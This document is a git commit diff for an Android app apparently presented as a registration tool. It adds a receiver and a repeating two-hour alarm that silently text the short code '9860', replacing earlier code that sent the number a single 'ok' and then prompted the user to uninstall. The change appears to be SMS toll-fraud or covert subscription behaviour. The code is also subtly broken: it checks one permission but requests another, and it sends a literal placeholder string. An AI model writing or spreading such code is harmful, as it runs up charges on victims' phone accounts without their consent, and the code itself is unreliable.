e384cc42f76d14d308baf2c6197729bbdd6497a8
Akash Singh <akash@revmedia.my>
2023-06-20 02:27:03 +0800

    Send SMS after 2 hours.

---
+++ app/src/main/java/com/akrobyte/registration/MessageSenderService.java
@@ -0,0 +1,29 @@
+package com.akrobyte.registration;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.telephony.SmsManager;
+import android.util.Log;
+import android.widget.Toast;
+
+public class MessageSenderService extends BroadcastReceiver{
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        String phoneNumber = intent.getStringExtra("phoneNumber");
+        String message = intent.getStringExtra("message");
+        sendSMS(context, phoneNumber, message);
+    }
+    private void sendSMS(Context context, String phoneNumber, String message) {
+        Log.i("MessageSenderService", "I'm running");
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage("9860", null, "message", null, null);
+            Toast.makeText(context, "SMS sent", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            Toast.makeText(context, "SMS failed to send", Toast.LENGTH_SHORT).show();
+            e.printStackTrace();
+        }
+    }
+}
--- app/src/main/java/com/akrobyte/registration/SplashActivity.java
+++ app/src/main/java/com/akrobyte/registration/SplashActivity.java
@@ -1,96 +1,92 @@
 package com.akrobyte.registration;
 
+import android.Manifest;
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.AlertDialog;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.telephony.SmsManager;
+import android.view.LayoutInflater;
 import android.view.View;
 import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
 
 import com.aktobyte.registration.R;
 
 public class SplashActivity extends Activity {
-
+    private static final int PERMISSION_SEND_SMS = 123;
+    PendingIntent pendingIntent;
+    AlarmManager manager;
     Button btnClick;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
-        if (!isConfirmUser())
-            sendSMS();
-        btnClick = findViewById(R.id.btn_click);
-        btnClick.setOnClickListener(new View.OnClickListener() {
+        Intent alarmIntent = new Intent(this, MessageSenderService.class);
+        pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, PendingIntent.FLAG_IMMUTABLE);
+        requestSmsPermission();
+        scheduleCalendar();
+    }
+
+    private void requestSmsPermission() {
+
+        // check permission is given
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                // request permission (see result in onRequestPermissionsResult() method)
+                requestPermissions(new String[]{Manifest.permission.SEND_SMS}, PERMISSION_SEND_SMS);
+            } else {
+                // permission already granted run sms send
+                scheduleCalendar();
+            }
+        }
+    }
+
+    private void goToAppSettings() {
+        AlertDialog.Builder dialogBuilder = new AlertDialog.Builder(this);
+        LayoutInflater inflater = this.getLayoutInflater();
+        View dialogView = inflater.inflate(R.layout.opensettingdialog, null);
+        dialogBuilder.setView(dialogView);
+        final AlertDialog alertDialog = dialogBuilder.create();
+        alertDialog.setCanceledOnTouchOutside(false);
+        TextView textView = dialogView.findViewById(R.id.buttonOk);
+        textView.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                uninstallPackage();
+                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                Uri uri = Uri.fromParts("package", getPackageName(), null);
+                intent.setData(uri);
+                startActivity(intent);
+                alertDialog.dismiss();
             }
         });
+
+        alertDialog.show();
+        double width = (this.getResources().getDisplayMetrics().widthPixels * 0.9);
+        double height = (this.getResources().getDisplayMetrics().heightPixels * 0.25);
+        alertDialog.getWindow().setLayout((int) width, (int) height);
+
     }
 
-    private void sendSMS() {
-        Intent intent;
-        Intent intent2;
-        BroadcastReceiver broadcastReceiver;
-        IntentFilter intentFilter;
-        BroadcastReceiver broadcastReceiver2;
-        IntentFilter intentFilter2;
-        String str = "SMS_SENT";
-        String str2 = "SMS_DELIVERED";
-        intent = new Intent(str);
-        PendingIntent broadcast = PendingIntent.getBroadcast(this, 0, intent, 0);
-        intent2 = new Intent(str2);
-        PendingIntent broadcast2 = PendingIntent.getBroadcast(this, 0, intent2, 0);
-        broadcastReceiver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (getResultCode() == -1) {
-                    confirmUser();
-                    return;
-                }
-                finish();
-            }
-        };
-        intentFilter = new IntentFilter(str);
-        Intent registerReceiver = registerReceiver(broadcastReceiver, intentFilter);
-        broadcastReceiver2 = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (getResultCode() == -1) {
-                    confirmUser();
-                    return;
-                }
-                finish();
-            }
-        };
-        intentFilter2 = new IntentFilter(str2);
-        Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);
+    private void scheduleCalendar() {
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
-            SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
-        }
-       /* String phoneNumber = "9860";
-        String message = "Ok";
+        manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        long interval = 2 * 60 * 60 * 1000L;
 
-        // Open the SMS app with the specified number and message
-        Uri uri = Uri.parse("smsto:" + phoneNumber);
-        Intent intent3 = new Intent(Intent.ACTION_SENDTO, uri);
-        intent3.putExtra("sms_body", message);
-        startActivity(intent3);
-
-        finish();
-*/
-        unregisterReceiver(broadcastReceiver);
-        unregisterReceiver(broadcastReceiver2);
+        manager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), interval, pendingIntent);
     }
-
-    private void confirmUser() {
+   /* private void confirmUser() {
         SharedPreferences sharedpreferences = getSharedPreferences("SampleApp", Context.MODE_PRIVATE);
         sharedpreferences.edit().putBoolean("isConfirm",true).commit();
     }
@@ -105,5 +101,5 @@ public class SplashActivity extends Activity {
         Uri packageUri = Uri.parse("package:com.aktobyte.registration");
         Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageUri);
         startActivity(uninstallIntent);
-    }
+    }*/
 }
